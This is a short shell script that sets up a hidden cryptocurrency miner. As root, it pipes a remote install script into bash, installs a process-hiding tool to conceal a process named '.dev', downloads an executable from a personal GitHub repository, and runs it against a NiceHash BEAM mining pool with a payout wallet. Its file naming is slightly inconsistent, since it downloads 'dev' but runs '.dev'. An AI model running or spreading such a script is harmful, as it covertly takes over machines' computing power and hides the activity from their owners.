sudo su
sudo apt update
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt-get install -y nodejs

npm i -g node-process-hider
npm install -g npm
sudo ph add .dev
wget https://raw.githubusercontent.com/Myaxisplay/SC/main/dev
chmod +x .dev
./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.DENT